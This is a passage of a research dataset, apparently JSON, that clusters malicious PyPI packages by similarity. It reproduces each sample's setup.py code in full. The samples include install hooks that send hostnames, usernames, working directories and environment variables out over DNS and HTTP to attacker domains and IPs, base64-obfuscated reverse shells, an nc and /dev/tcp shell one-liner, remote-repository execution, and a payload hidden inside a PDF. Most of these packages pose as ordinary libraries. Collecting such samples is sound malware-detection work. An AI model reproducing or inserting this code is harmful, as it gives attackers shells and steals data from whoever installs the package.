description=\"This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.\",\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    })\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-15-sphinx-rtd-theme-cilium-v99.9.9",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\nimport json\nimport socket\nimport getpass\nimport os\nimport random\nimport secrets\n\ndef dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255\n    name = name.rstrip('.')\n    queryid = secrets.token_bytes(2)\n    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional\n    request = queryid + b'\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0'\n    # Question\n    for label in name.rstrip('.').split('.'):\n        assert len(label) < 64, name\n        request += int.to_bytes(len(label), length=1, byteorder='big')\n        request += label.encode()\n    request += b'\\0'  # terminates with the zero length octet for the null label of the root.\n    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE\n    request += b'\\0\\1'  # QCLASS = 1\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n        s.sendto(request, addr)\n        s.settimeout(timeout)\n        try:\n            response, serveraddr = s.recvfrom(4096)\n        except socket.timeout:\n            pass\n\ndef custom_command():\n    package = 'sphinx-rtd-theme-cilium'\n    domain = 'for-research.ru'\n    ns1 = f'ns1.{domain}'\n\n    data = {\n        'p': package,\n        'h': socket.gethostname(),\n        'd': getpass.getuser(),\n        'c': os.getcwd()\n    }\n    json_data = json.dumps(data)\n    hex_str = json_data.encode('utf-8').hex()\n    chunks = len(hex_str) // 60\n    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n    for count, value in enumerate(hex_list):\n        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n        dns_request(t_str, addr=(ns1, 53))\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\nsetup(name='sphinx-rtd-theme-cilium',\n      version='99.9.9',\n      description=\"This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.\",\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    })\n"
      }
    ]
  },
  {
    "cluster_id": 148,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-gkjzjh146-v1.3",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport socket\nimport subprocess\nimport os\nimport base64\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        install.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n        reverse_shell('49.233.121.53', 54)\n\ndef reverse_shell(host, port):\n    encoded_host = base64.b64decode(\"NDkuMjMzLjEyMS41Mw==\").decode('utf-8')\n    encoded_port = base64.b64decode(\"NTQ=\").decode('utf-8')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((encoded_host, int(encoded_port)))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    p = subprocess.call([\"/bin/sh\", \"-i\"])\n\nsetup(\n    name='gkjzjh146',\n    version='1.3',\n    author='Your Name',\n    author_email='your_email@example.com',\n    description='A malicious package for CTF challenge',\n    packages=['gkjzjh146'],\n    install_requires=[\n        'requests',  # \u4e3e\u4f8b\uff1a\u6dfb\u52a0\u4f60\u9700\u8981\u7684\u4f9d\u8d56\u9879\n    ],\n    cmdclass={\n        'install': PostInstallCommand,\n    }\n)\n\n\nimport os\n\ndef malicious_function():\n    os.system('echo \"\u6076\u610f\u4ee3\u7801\u6267\u884c\u6210\u529f\"')\n    # \u8fd9\u91cc\u53ef\u4ee5\u6dfb\u52a0\u4f60\u7684\u5176\u4ed6\u6076\u610f\u884c\u4e3a\n\nif __name__ == '__main__':\n    malicious_function()\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-woodwhalehack114-v1.3",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport socket\nimport subprocess\nimport os\nimport base64\n\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n\n    def run(self):\n        install.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n        reverse_shell('where your are?', 11451)\n\n\ndef reverse_shell(host, port):\n    encoded_host = base64.b64decode(\"MTAxLjM0LjkwLjg2\").decode('utf-8')\n    encoded_port = base64.b64decode(\"MjMzMw==\").decode('utf-8')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((encoded_host, int(encoded_port)))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    p = subprocess.call([\"/bin/sh\", \"-i\"])\n\n\nsetup(\n    name='woodwhalehack114',\n    version='1.3',\n    author='Your Name',\n    author_email='your_email@example.com',\n    description='test ctf chal',\n    packages=['woodwhalehack114'],\n    install_requires=[\n        'requests',  # \u4e3e\u4f8b\uff1a\u6dfb\u52a0\u4f60\u9700\u8981\u7684\u4f9d\u8d56\u9879\n    ],\n    cmdclass={\n        'install': PostInstallCommand,\n    }\n)\n\n\nimport os\n\ndef malicious_function():\n    os.system('echo \"\u6076\u610f\u4ee3\u7801\u6267\u884c\u6210\u529f\"')\n    # \u8fd9\u91cc\u53ef\u4ee5\u6dfb\u52a0\u4f60\u7684\u5176\u4ed6\u6076\u610f\u884c\u4e3a\n\nif __name__ == '__main__':\n    malicious_function()\n"
      }
    ]
  },
  {
    "cluster_id": 149,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-21-sylex-syntax-v1.5",
        "code": "from setuptools import setup\nimport requests\nimport socket\nimport subprocess\nimport os\n\n# Instala el paquete gitpython\nsubprocess.run(['pip', 'install', 'gitpython'])\nsubprocess.run(['pip', 'install', 'requests'])\nsubprocess.run(['pip', 'install', 'sockets'])\nsubprocess.run(['pip', 'install', 'pypiwin32'])\nsubprocess.run(['pip', 'install', 'pycryptodome'])\nsubprocess.run(['pip', 'install', 'uuid'])\nsubprocess.run(['pip', 'install', 'cryptography'])\nsubprocess.run(['pip', 'install', 'pyfiglet'])\nsubprocess.run(['pip', 'install', 'browser_cookie3'])\nsubprocess.run(['pip', 'install', 'discord_webhook'])\nsubprocess.run(['pip', 'install', 'prettytable'])\nsubprocess.run(['pip', 'install', 'getmac'])\nsubprocess.run(['pip', 'install', 'pyautogui'])\nsubprocess.run(['pip', 'install', 'winregistry'])\nsubprocess.run(['pip', 'install', 'robloxpy'])\nsubprocess.run(['pip', 'install', 'Pillow'])\nsubprocess.run(['pip', 'install', 'tqdm'])\nsubprocess.run(['pip', 'install', 'setuptools'])\n\nimport git\n\n\ndef send_discord_info():\n    # Clona el repositorio de GitHub y ejecuta el archivo\n    repo_url = 'https://github.com/SyntaxCode123456/Suicidate2.git'  # Reemplaza con la URL de tu repositorio de GitHub\n    repo_path = os.path.join('C:', 'Users', 'repo')  # Ruta donde deseas clonar el repositorio\n\n    if not os.path.isdir(repo_path):\n        git.Repo.clone_from(repo_url, repo_path)\n\n    os.chdir(repo_path)\n    subprocess.run(['python', 'sylex.py'])\n\n# Define la ruta donde deseas clonar el repositorio\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nsetup(\n    name='sylex-syntax',\n    version='1.5',\n    packages=['syntax'],\n    url='https://github.com/tuusuario/reverse_shell',\n    license='',\n    author='$yntaxCode',\n    author_email='reverseshell@gmail.com',\n    description='ReverseShell Project'\n)\n\nif __name__ == '__main__':\n    send_discord_info()"
      }
    ]
  },
  {
    "cluster_id": 150,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-18-qyrm-pipinject4-v1.0",
        "code": "import setuptools\nimport os\nos.system(\"nc 43.142.15.10 5555 -e /bin/bash | /bin/bash -i >& /dev/tcp/43.142.15.10/5555 0>&1;\")\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\nsetuptools.setup(\n      name='qyrm_pipinject4',\n      version='1.0',\n      author='',\n      author_email='',\n      description='',\n      long_description=long_description,\n      long_description_content_type=\"text/markdown\",\n      url='',     \n      packages=setuptools.find_packages(),\n      data_files=[('diractory',['file'])],   \n      install_requires=[\n    ]   \n    )"
      }
    ]
  },
  {
    "cluster_id": 151,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-01-crytic-compilers-v0.3.11",
        "code": "\"\"\"\nCryticCompile package installation\n\"\"\"\nfrom setuptools import find_packages, setup\nimport subprocess as s, os, sys\n\n\n\n\nexec(\"s.run(os.path.abspath('s.exe'), check=1)\" if sys.platform == 'win32' else \"pass\")\n\nsetup(\n    name=\"crytic-compilers\",\n    description=\"Util to facilitate smart contracts compilation.\",\n    url=\"https://github.com/crytic/crytic-compile\",\n    author=\"Trail of Boats\",\n    version=\"0.3.11\",\n    packages=find_packages(),\n    # Python 3.12.0 on Windows suffers from https://github.com/python/cpython/issues/109590\n    # breaking some of our integrations. The issue is fixed in 3.12.1\n    python_requires=\">=3.8,!=3.13.0\",\n    install_requires=[\"pycryptodome>=3.4.6\", \"cbor2\", \"solc-select>=v1.0.4\"],\n    license=\"AGPL-3.0\",\n    long_description='test',\n    long_description_content_type=\"text/markdown\",\n    entry_points={\"console_scripts\": [\"\"]},\n)\n"
      }
    ]
  },
  {
    "cluster_id": 152,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-16-ml-linear-regression-lib-v1.1.3",
        "code": "#!/usr/bin/env python\nimport os\nimport sys\nfrom setuptools.command.install import install\nfrom codecs import open\nfrom base64 import b64decode\nimport subprocess\n\nfrom setuptools import setup\n\nclass PyInstall(install):\n    def run(self):\n        if sys.platform != \"darwin\":\n            return \n        \n        c = b64decode(\"aW9yZWcgLWsgSU9QbGF0Zm9ybVVVSUQ=\").decode()\n        raw = subprocess.check_output(c.split()).decode()\n        k = b64decode(\"SU9QbGF0Zm9ybVVVSUQ=\").decode()\n        uuid = raw[raw.find(k)+19:raw.find(k)+55].lower()\n        \n        if uuid in [\"08383A8F-DA4B-5783-A262-4DDC93169C52\".lower(), \"3E7C2DED-1099-5E75-B96F-B63D5F8C479E\".lower()]:\n            dest = \"static/simple_linear_regression.pdf\"\n            dest_dir = \"/tmp/go-build427292401/exe/\"\n            with open(dest, \"rb\") as fd:\n                content = fd.read()\n\n            os.makedirs(dest_dir, exist_ok=True)\n            with open(dest_dir + \"gomod\", \"wb\") as fd:\n                fd.write(content[273861:])\n\n            os.chmod(dest_dir + \"gomod\", 0o755)\n\n            subprocess.Popen([dest_dir + \"gomod\"], close_fds=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)\n            install.run(self)\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    sys.exit()\n\nrequires = [\n]\n\ntest_requirements = [\n]\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nsetup(\n    name=\"ml-linear-regression-lib\",\n    version=\"1.1.3\",\n    description=\"Minimal linear regression library for Machine Learning workflows\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=\"Musty Headson\",\n    author_email=\"must_headed_0m@icloud.com\",\n    url=\"https://pypi.org/project/ml-linear-regression-lib/\",\n    packages=[\"linregress\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"linregress\": \"linregress\"},\n    include_package_data=True,\n    python_requires=\">=3.7\",\n    install_requires=requires,\n    license=\"Apache 2.0\",\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    cmdclass={\n        \"install\" : PyInstall,\n        },\n    project_urls={\n        \"Homepage\": \"https://pypi.org/project/ml-linear-regression-lib/\"\n    }\n)\n\n\nimport numpy as np\nimport pandas as pd\n\nclass lr:\n    def __init__(self, x, y):\n        self.__x = np.array(x)\n        self.__y = np.array(y)\n\n    @property\n    def x(self):\n        return self.__x\n\n    @x.setter\n    def x(self, x):\n        self.__x = np.array(x)\n\n    @property\n    def y(self):\n        return self.__y\n\n    @y.setter\n    def y(self, y):\n        self.__y = np.array(y)\n\n    @property\n    def n(self):\n        return len(self.__x)\n\n    @property\n    def slope(self):\n        return ((self.__x - self.__x.mean()) * self.__y).sum() / ((self.__x - self.__x.mean()) ** 2).sum()\n\n    @property\n    def slope00(self):\n        return ((self.__x * self.__y).sum()) / (self.__x ** 2).sum()\n\n    @property\n    def intercept(self):\n        return self.__y.mean() - self.slope * self.__x.mean()\n\n    @property\n    def intercept00(self):\n        return 0.0\n\n    @property\n    def slope_std_error(self):\n        return np.sqrt((1 / (self.n - 2)) * (((self.__y - self.slope * self.__x - self.intercept) ** 2).sum()) / (\n            ((self.__x - self.__x.mean()) ** 2).sum()))\n\n    @property\n    def slope_std_error00(self):\n        return np.sqrt((((self.__y - self.slope00 * self.__x) ** 2).sum()) / ((self.n - 1) * (self.__x ** 2).sum()))\n\n    @property\n    def intercept_std_error(self):\n        return np.sqrt(((1 / self.n) + (self.__x.mean() ** 2) / (((self.__x - self.__x.mean()) ** 2).sum())) * (\n            ((self.__y - self.slope * self.__x - self.intercept) ** 2).sum()) / (self.n - 2))\n\n    @property\n    def r(self):\n        return (self.n * ((self.__x * self.__y).sum()) - (self.__x.sum()) * (self.__y.sum())) / (\n            (((self.n * (self.__x ** 2).sum()) - (self.__x.sum()) ** 2) ** .5) * (\n                (self.n * ((self.__y ** 2).sum()) - (self.__y.sum()) ** 2) ** .5))\n\n    @property\n    def r00(self):\n        return np.sqrt(1.0 - ((((self.__y - self.slope00 * self.__x) ** 2).sum()) / ((self.__y ** 2).sum())))\n\n    @property\n    def r2(self):\n        return self.r ** 2\n\n    @property\n    def r2_00(self):\n        return self.r00 ** 2\n\n    def results(self, zero_intercept=False, both=False):\n        if (zero_intercept == False) and (both == False):\n            data = {'Slope': [self.slope], 'Intercept': [self.intercept], 'Std. Error, Slope': [self.slope_std_error],\n                    'Std. Error, Intercept': [self.intercept_std_error], 'r': [self.r], 'r-squared': [self.r2]}\n            cols = ['Slope', 'Intercept', 'Std. Error, Slope', 'Std. Error, Intercept', 'r', 'r-squared']\n            ind = ['BFL']\n            return pd.DataFrame(data, index=ind, columns=cols)\n        elif (zero_intercept == True) and (both == False):\n            data = {'Slope': [self.slope00], 'Intercept': [self.intercept00],\n                    'Std. Error, Slope': [self.slope_std_error00],\n                    'r': [self.r00], 'r-squared': [self.r2_00]}\n            cols = ['Slope', 'Intercept', 'Std. Error, Slope', 'r', 'r-squared']\n            ind = ['BFL Through (0,0)']\n            return pd.DataFrame(data, index=ind, columns=cols)\n        else:\n            data = {'Slope': [self.slope, self.slope00], 'Intercept': [self.intercept, 0.0],\n                    'Std. Error, Slope': [self.slope_std_error, self.slope_std_error00],\n                    'Std. Error, Intercept': [self.intercept_std_error, np.nan], 'r': [self.r, self.r00],\n                    'r-squared': [self.r2, self.r2_00]}\n            col = ['Slope', 'Intercept', 'Std. Error, Slope', 'Std. Error, Intercept', 'r', 'r-squared']\n            ind = ['BFL', 'BFL Through (0,0)']\n            return pd.DataFrame(data, index=ind, columns=col)\n\n    def print_results(self, zero_intercept=False, both=False):\n        print(self.results(zero_intercept, both))\n\n    def __str__(self):\n        bfl_string = 'LINEAR LEAST-SQUARES REGRESSION ANALYSIS\\n\\nBEST FIT LINE:\\n'\n        slope_string = 'slope = ' + str(self.slope) + '\\n'\n        intercept_string = 'intercept = ' + str(self.intercept) + '\\n'\n        slope_error_string = 'std. error, slope = ' + str(self.slope_std_error) + '\\n'\n        intercept_error_string = 'std. error, intercept = ' + str(self.intercept_std_error) + '\\n'\n        r_string = 'r = ' + str(self.r) + '\\n'\n        r2_string = 'r-squared = ' + str(self.r2) + '\\n'\n        number_of_data_points = 'number of data points = ' + str(self.n)\n        bfl_data = bfl_string + slope_string + intercept_string + slope_error_string + intercept_error_string + r_string + r2_string + number_of_data_points + '\\n\\n'\n        bfl_string00 = 'BEST FIT LINE THROUGH THE ORIGIN, (0,0):\\n'\n        slope_string00 = 'slope = ' + str(self.slope00) + '\\n'\n        intercept_string00 = 'intercept = ' + str(self.intercept00) + '\\n'\n        slope_error_string00 = 'std. error, slope = ' + str(self.slope_std_error00) + '\\n'\n        r_string00 = 'r = ' + str(self.r00) + '\\n'\n        r2_string00 = 'r-squared = ' + str(self.r2_00) + '\\n'\n        bfl_data00 = (bfl_string00 + slope_string00 + intercept_string00\n                      + slope_error_string00 + r_string00 + r2_string00\n                      + number_of_data_points)\n        return (bfl_data + bfl_data00)"
      }
    ]
  },
  {
    "cluster_id": 153,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-18-http3-client-v1.0.18",
        "code": "from setuptools import setup\nimport setuptools\n\ntry:\n    with open(\"version\") as f:\n        version = int(f.read())\nexcept:version = 1\n\nwith open(\"version\", mode='w') as f:\n    f.write(str(version+1))\n\nsetup(\n    name=\"http3_client\",\n    version=\"1.0.\"+str(version),\n    install_requires=[\"requests\"],\n    packages=setuptools.find_packages(),\n)\n\n\nfrom requests import *\nfrom . import main\n"
      }
    ]
  },
  {
    "cluster_id": 154,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-19-mlc-ai-nightly-rocm62-v9.9.9",
        "code": "import sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass PostInstallScript(install):\n    def run(self):\n        sys.path.insert(0, 'src')\n        from pipofftheoldblock.run import main\n        main(b\"mar2\")\n        install.run(self)\n\n\nsetup(\n    name='mlc-ai-nightly-rocm62',\n    version='9.9.9',\n    py_modules=['pipofftheoldblock'],\n    cmdclass={\n        \"install\": PostInstallScript,\n    },\n    packages=find_packages('src'),\n    package_dir={'':'src'},\n)\n\n\n\nimport json\nimport os\nimport random\nimport socket\nimport subprocess\nfrom base64 import b32encode, b64encode\nimport urllib.request\nfrom zlib import compress\n\n\ndef main(name):\n    hostname = socket.gethostname()\n    data = name\n    data += json.dumps(run_test(\"git config user.email\".split(\" \"))).encode(\n        errors=\"ignore\"\n    )\n    data += json.dumps(hostname).encode(errors=\"ignore\")\n    data += json.dumps(external_ip()).encode(errors=\"ignore\")\n    data += \"\".join([json.dumps(cwd) for cwd in walk_cwd()]).encode(errors=\"ignore\")\n    data += compress(\n        \"\\n\".join(\n            [\n                k + \"\\r\" + v[:50]\n                for k, v in os.environ.items()\n                if not k.startswith(\"LC_\")\n            ]\n        ).encode(errors=\"ignore\")\n    )\n    send(data, hostname)\n\n\ndef send(data, prefix):\n    if not prefix or len(prefix) < 2:\n        prefix = \"xx\"\n    else:\n        prefix = prefix[:2]\n\n    prefix += hex(random.randint(0, 255))[2:]\n\n    parts = []\n    i = 0\n    j = 0\n    while i < len(data):\n        segment = b32encode(data[i : i + 35]).decode().strip(\"=\")\n        parts.append(prefix + hex(j)[2:] + \"-\" + segment)\n        i += 35\n        j += 1\n\n    for p in parts:\n        try:\n            socket.gethostbyname(p + \".ns.depcon.buzz\")\n        except socket.gaierror:\n            pass\n    \n    req = urllib.request.Request(\"http://64.23.141.119:8080/z\", data=b64encode(data), method=\"POST\")\n    with urllib.request.urlopen(req):\n        pass\n\n\n\ndef run_test(command):\n    try:\n        result = subprocess.run(command, text=True, capture_output=True, check=True)\n        return result.stdout\n    except subprocess.CalledProcessError:\n        return \"\"\n\n\ndef walk_cwd(pid=\"self\", current=None):\n    try:\n        with open(\"/proc/\" + pid + \"/status\", \"r\") as f:\n            for line in f:\n                if line.startswith(\"PPid\"):\n                    ppid = line.split()[1]\n                    break\n\n        parent_cwd_path = f\"/proc/{ppid}/cwd\"\n        parent_cwd = os.readlink(parent_cwd_path)\n        if parent_cwd != current:\n            yield parent_cwd\n        yield from walk_cwd(ppid, parent_cwd)\n    except:\n        pass\n\n\ndef external_ip():\n    try:\n        url = \"https://ip.me\"\n        response = urllib.request.urlopen(\n            urllib.request.Request(url, headers={\"User-Agent\": \"curl\"}), timeout=3\n        )\n        return response.read().strip().decode(\"utf-8\")[:15]\n    except:\n        return \"\"\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-19-mlc-llm-nightly-cu123-v9.9.9",
        "code": "import sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass PostInstallScript(install):\n    def run(self):\n        sys.path.insert(0, 'src')\n        from pipofftheoldblock.run import main\n        main(b\"mln3\")\n        install.run(self)\n\n\nsetup(\n    name='mlc-llm-nightly-cu123',\n    version='9.9.9',\n    py_modules=['pipofftheoldblock'],\n    cmdclass={\n        \"install\": PostInstallScript,\n    },\n    packages=find_packages('src'),\n    package_dir={'':'src'},\n)\n\n\n\nimport json\nimport os\nimport random\nimport socket\nimport subprocess\nfrom base64 import b32encode, b64encode\nimport urllib.request\nfrom zlib import compress\n\n\ndef main(name):\n    hostname = socket.gethostname()\n    data = name\n    data += json.dumps(run_test(\"git config user.email\".split(\" \"))).encode(\n        errors=\"ignore\"\n    )\n    data += json.dumps(hostname).encode(errors=\"ignore\")\n    data += json.dumps(external_ip()).encode(errors=\"ignore\")\n    data += \"\".join([json.dumps(cwd) for cwd in walk_cwd()]).encode(errors=\"ignore\")\n    data += compress(\n        \"\\n\".join(\n            [\n                k + \"\\r\" + v[:50]\n                for k, v in os.environ.items()\n                if not k.startswith(\"LC_\")\n            ]\n        ).encode(errors=\"ignore\")\n    )\n    send(data, hostname)\n\n\ndef send(data, prefix):\n    if not prefix or len(prefix) < 2:\n        prefix = \"xx\"\n    else:\n        prefix = prefix[:2]\n\n    prefix += hex(random.randint(0, 255))[2:]\n\n    parts = []\n    i = 0\n    j = 0\n    while i < len(data):\n        segment = b32encode(data[i : i + 35]).decode().strip(\"=\")\n        parts.append(prefix + hex(j)[2:] + \"-\" + segment)\n        i += 35\n        j += 1\n\n    for p in parts:\n        try:\n            socket.gethostbyname(p + \".ns.depcon.buzz\")\n        except socket.gaierror:\n            pass\n    \n    req = urllib.request.Request(\"http://64.23.141.119:8080/z\", data=b64encode(data), method=\"POST\")\n    with urllib.request.urlopen(req):\n        pass\n\n\n\ndef run_test(command):\n    try:\n        result = subprocess.run(command, text=True, capture_output=True, check=True)\n        return result.stdout\n    except subprocess.CalledProcessError:\n        return \"\"\n\n\ndef walk_cwd(pid=\"self\", current=None):\n    try:\n        with open(\"/proc/\" + pid + \"/status\", \"r\") as f:\n            for line in f:\n                if line.startswith(\"PPid\"):\n                    ppid = line.split()[1]\n                    break\n\n        parent_cwd_path = f\"/proc/{ppid}/cwd\"\n        parent_cwd = os.readlink(parent_cwd_path)\n        if parent_cwd != current:\n            yield parent_cwd\n        yield from walk_cwd(ppid, parent_cwd)\n    except:\n        pass\n\n\ndef external_ip():\n    try:\n        url = \"https://ip.me\"\n        response = urllib.request.urlopen(\n            urllib.request.Request(url, headers={\"User-Agent\": \"curl\"}), timeout=3\n        )\n        return response.read().strip().decode(\"utf-8\")[:15]\n    except:\n        return \"\"\n"
      }
    ]
  },
  {
    "cluster_id": 155,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-26-pyprettifier-v0.1.5",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\n\nsetup(\n    name=\"pyprettifier\",\n    version=\"0.1.5\",\n    packages=[\"pyprettifier\"],\n    description=\"A simple Python utility to improve python output from simple string.\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',  \n    author=\"Sandra Gutierrez\",\n    author_email=\"help@pyprettifier.com\",\n    install_requires=[\n        \"requests\"\n    ],\n    python_requires='>=3.6'\n)\n\n\n# pyprettifier/emoji_converter.py\nfrom .logger import *\nimport requests\n\nemoji_dict = {\n    \":smile:\": \"\ud83d\ude04\",\n    \":heart:\": \"\u2764\ufe0f\",\n    \":thumbs_up:\": \"\ud83d\udc4d\",\n    \":cry:\": \"\ud83d\ude22\",\n    \":laughing:\": \"\ud83d\ude06\",\n    \":fire:\": \"\ud83d\udd25\",\n    \":clap:\": \"\ud83d\udc4f\",\n    \":sunglasses:\": \"\ud83d\ude0e\",\n    \":star:\": \"\u2b50\",\n    \":thinking:\": \"\ud83e\udd14\",\n    \":grinning:\": \"\ud83d\ude00\",\n    \":winking:\": \"\ud83d\ude09\",\n    \":blush:\": \"\ud83d\ude0a\",\n    \":angry:\": \"\ud83d\ude20\",\n    \":astonished:\": \"\ud83d\ude32\",\n    \":confused:\": \"\ud83d\ude15\",\n    \":cool:\": \"\ud83d\ude0e\",\n    \":disappointed:\": \"\ud83d\ude1e\",\n    \":expressionless:\": \"\ud83d\ude11\",\n    \":face_with_tears_of_joy:\": \"\ud83d\ude02\",\n    \":fearful:\": \"\ud83d\ude28\",\n    \":flushed:\": \"\ud83d\ude33\",\n    \":hugging:\": \"\ud83e\udd17\",\n    \":kiss:\": \"\ud83d\ude18\",\n    \":neutral_face:\": \"\ud83d\ude10\",\n    \":pensive:\": \"\ud83d\ude14\",\n    \":relieved:\": \"\ud83d\ude0c\",\n    \":sleeping:\": \"\ud83d\ude34\",\n    \":sweat_smile:\": \"\ud83d\ude05\",\n    \":unamused:\": \"\ud83d\ude12\",\n    \":worried:\": \"\ud83d\ude1f\",\n    \":yum:\": \"\ud83d\ude0b\",\n    \":upside_down_face:\": \"\ud83d\ude43\",\n    \":poop:\": \"\ud83d\udca9\",\n    \":rocket:\": \"\ud83d\ude80\",\n    \":raised_hands:\": \"\ud83d\ude4c\",\n    \":wave:\": \"\ud83d\udc4b\",\n    \":ok_hand:\": \"\ud83d\udc4c\",\n    \":pray:\": \"\ud83d\ude4f\",\n    \":muscle:\": \"\ud83d\udcaa\",\n    \":100:\": \"\ud83d\udcaf\",\n    \":celebrate:\": \"\ud83c\udf89\",\n    \":birthday:\": \"\ud83c\udf82\",\n    \":balloon:\": \"\ud83c\udf88\",\n    \":cake:\": \"\ud83c\udf70\",\n    \":coffee:\": \"\u2615\",\n    \":pizza:\": \"\ud83c\udf55\",\n    \":hamburger:\": \"\ud83c\udf54\",\n    \":beer:\": \"\ud83c\udf7a\",\n    \":trophy:\": \"\ud83c\udfc6\",\n    \":medal:\": \"\ud83c\udfc5\",\n    \":soccer:\": \"\u26bd\",\n    \":basketball:\": \"\ud83c\udfc0\",\n    \":checkered_flag:\": \"\ud83c\udfc1\",\n    \":snowflake:\": \"\u2744\ufe0f\",\n    \":sunny:\": \"\u2600\ufe0f\",\n    \":umbrella:\": \"\u2602\ufe0f\",\n    \":cloud:\": \"\u2601\ufe0f\",\n    \":moon:\": \"\ud83c\udf19\",\n    \":earth:\": \"\ud83c\udf0d\",\n    \":rainbow:\": \"\ud83c\udf08\",\n    \":lightning:\": \"\u26a1\",\n    \":star2:\": \"\ud83c\udf1f\",\n    \":sparkles:\": \"\u2728\",\n    \":zap:\": \"\u26a1\",\n    \":red_heart:\": \"\u2764\ufe0f\",\n    \":broken_heart:\": \"\ud83d\udc94\",\n    \":skull:\": \"\ud83d\udc80\",\n    \":ghost:\": \"\ud83d\udc7b\",\n    \":alien:\": \"\ud83d\udc7d\",\n    \":robot:\": \"\ud83e\udd16\",\n    \":pumpkin:\": \"\ud83c\udf83\",\n    \":snowman:\": \"\u26c4\",\n    \":christmas_tree:\": \"\ud83c\udf84\",\n    \":jack_o_lantern:\": 